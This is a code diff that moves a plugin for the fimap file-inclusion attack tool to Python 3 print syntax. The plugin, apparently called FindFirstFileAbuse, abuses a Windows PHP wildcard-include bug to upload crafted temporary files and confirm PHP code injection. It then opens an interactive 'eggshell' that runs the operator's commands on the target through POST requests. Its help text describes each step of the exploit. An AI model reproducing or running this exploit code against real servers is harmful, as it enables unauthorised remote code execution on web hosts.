@@ -1,3 +1,4 @@
+from __future__ import print_function
 from plugininterface import basePlugin
 
 # Plugin by Iman Karim <fimap.dev@gmail.com>
@@ -88,60 +89,60 @@ class FindFirstFileAbuse(basePlugin):
                     
                     if (idx == 1):
                         self.remotetmpdir = raw_input("Please type in the complete URL of the Remote Temporary Directory: ")
-                        print "Remote Temporary Directory URL changed to: %s" %(self.remotetmpdir)
+                        print("Remote Temporary Directory URL changed to: %s" %(self.remotetmpdir))
                     
                     elif (idx == 2):
-                        print "AutoProbe not implemented right now :("
+                        print("AutoProbe not implemented right now :(")
                         
                     elif (idx == 3):
                         tmp = raw_input("Please type in the number of attempts you wish: ")
                         try:
                             n = int(tmp)
                             if (n <= 0):
-                                print "WTH. Zero or less attempts are not smart bro."
+                                print("WTH. Zero or less attempts are not smart bro.")
                             else:
                                 self.maxAttempts = n
-                                print "MaxAttempts changed to: %s" %(self.maxAttemps)
+                                print("MaxAttempts changed to: %s" %(self.maxAttemps))
                         except:
-                            print "Invalid number."
+                            print("Invalid number.")
                         
                     elif (idx == 4):
                         tmp = raw_input("Please type in the number of threads you wish: ")
                         try:
                             n = int(tmp)
                             if (n <= 0):
-                                print "WTH. Zero or less threads are not smart bro."
+                                print("WTH. Zero or less threads are not smart bro.")
                             else:
                                 self.maxThreads = n
-                                print "MaxThreads changed to: %s" %(self.maxThreads)
+                                print("MaxThreads changed to: %s" %(self.maxThreads))
                         except:
-                            print "Invalid number."
+                            print("Invalid number.")
                         
                     elif (idx == 5):
                         self.egg = raw_input("Please type location where to try to drop the egg.\nPlease no trailing '\\' :")
-                        print "EggDrop location changed to: %s" %(self.egg)
+                        print("EggDrop location changed to: %s" %(self.egg))
                     
                     elif (idx == 6):
                         self.lotteryTicket = raw_input("Please type in your new lottery ticket: ")
-                        print "LotteryTicket changed to: %s" %(self.lotteryTicket)
+                        print("LotteryTicket changed to: %s" %(self.lotteryTicket))
                     
                                         
                     elif(idx == 0):
-                        print "This plugin uses a bug in the windows PHP versions which allows basicly to"
-                        print "use jokers while including files."
-                        print "You have to know the absolute path to the temporary directory where PHP"
-                        print "will store its temporary files."
-                        print "The plugin will then upload specially crafted files and tries to include"
-                        print "them using your 'LotteryTicket' you can provide."
-                        print "Your 'LotteryTicket' should contain a FindFirstFile compatible wildcard."
-                        print "Print by default the 'LotteryTicket' is phpA<tmp which you can basicly translate to:"
-                        print "'phpA*tmp'."
-                        print "Once the plugin managed to exploit this vulnerability you will be prompted to the"
-                        print "fimap lite shell which you should replace with your own shell asap."
+                        print("This plugin uses a bug in the windows PHP versions which allows basicly to")
+                        print("use jokers while including files.")
+                        print("You have to know the absolute path to the temporary directory where PHP")
+                        print("will store its temporary files.")
+                        print("The plugin will then upload specially crafted files and tries to include")
+                        print("them using your 'LotteryTicket' you can provide.")
+                        print("Your 'LotteryTicket' should contain a FindFirstFile compatible wildcard.")
+                        print("Print by default the 'LotteryTicket' is phpA<tmp which you can basicly translate to:")
+                        print("'phpA*tmp'.")
+                        print("Once the plugin managed to exploit this vulnerability you will be prompted to the")
+                        print("fimap lite shell which you should replace with your own shell asap.")
                     
                     elif (idx == 7):
                         if (self.remotetmpdir != None and self.remotetmpdir != ""):
-                            print "Launching attack..."
+                            print("Launching attack...")
                             path, postdata, header, trash = haxhelper.getHaxDataForCustomFile(self.remotetmpdir + "\\" + self.lotteryTicket)
                             
                             if (self.createEgg(haxhelper, path, postdata)):
@@ -170,7 +171,7 @@ class FindFirstFileAbuse(basePlugin):
                                 res = haxhelper.doRequest(url, post, header)
                                 
                                 if (res.find(answer) != -1):
-                                    print "PHP Code Injection thru EggDrop works!"
+                                    print("PHP Code Injection thru EggDrop works!")
                                     xmlconfig = haxhelper.parent_codeinjector.config["XML2CONFIG"]
                                     shellquiz, shellanswer = xmlconfig.generateShellQuiz(haxhelper.isUnix())
                                     shell_test_code = shellquiz
@@ -193,12 +194,12 @@ class FindFirstFileAbuse(basePlugin):
                                                 working_shell = item
                                                 self._log("Execution thru '%s' works!"%(name), self.LOG_ALWAYS)
                                                 
-                                                print "--------------------------------------------------------------------"
-                                                print "Welcome to the fimap_eggshell!"
-                                                print "This is a lite version of the fimap shell."
-                                                print "Consider this shell as a temporary shell you should get rid of asap."
-                                                print "Upload your own shell to be on the safe side."
-                                                print "--------------------------------------------------------------------"  
+                                                print("--------------------------------------------------------------------")
+                                                print("Welcome to the fimap_eggshell!")
+                                                print("This is a lite version of the fimap shell.")
+                                                print("Consider this shell as a temporary shell you should get rid of asap.")
+                                                print("Upload your own shell to be on the safe side.")
+                                                print("--------------------------------------------------------------------")  
                                                 
                                                 payload = raw_input(shell_banner)
                                                 
@@ -210,18 +211,18 @@ class FindFirstFileAbuse(basePlugin):
                                                     if (postdata != ""):
                                                         payload = "%s&%s" %(postdata, payload)
                                                     code = self.doPostRequest(url, payload, header)
-                                                    print code
+                                                    print(code)
                                                     payload = raw_input(shell_banner)
                                                 
                                                 return
                                         else:
                                             self._log("Skipping execution method '%s'..."%(name), self.LOG_DEBUG)
                                 else:
-                                    print "PHP Code Injection thru EggDrop failed :("
+                                    print("PHP Code Injection thru EggDrop failed :(")
                                     return
                             
                         else:
-                            print "No Remote Temporary Directory defined."
+                            print("No Remote Temporary Directory defined.")
                             
                 except (ValueError):
                     pass
@@ -249,7 +250,7 @@ class FindFirstFileAbuse(basePlugin):
                 newThread = ProbeThread(host, 80, content, haxhelper, self.display)
                 runningThreads.append(newThread)
                 newThread.start()
-                print "Thread Attempt %d started..." %(attempt)
+                print("Thread Attempt %d started..." %(attempt))
                 attempt+=1
 
             for probe in runningThreads:
@@ -262,10 +263,10 @@ class FindFirstFileAbuse(basePlugin):
                 break
             
         if (success):
-            print "Egg dropped successfully!"
+            print("Egg dropped successfully!")
         
-        print "Waiting for remaining threads to finish..."
-        print "Hit CTRL+C to just kill the threads like an arse."
+        print("Waiting for remaining threads to finish...")
+        print("Hit CTRL+C to just kill the threads like an arse.")
         try:
             while(len(runningThreads) > 0):
                     for t in runningThreads:
@@ -276,9 +277,9 @@ class FindFirstFileAbuse(basePlugin):
         except KeyboardInterrupt:
             while(len(runningThreads) > 0):
                 runningThreads.remove(0)
-            print "Carelessly ignoring threads..."
+            print("Carelessly ignoring threads...")
         
-        print "Finished."
+        print("Finished.")
         
         return(success)
                     
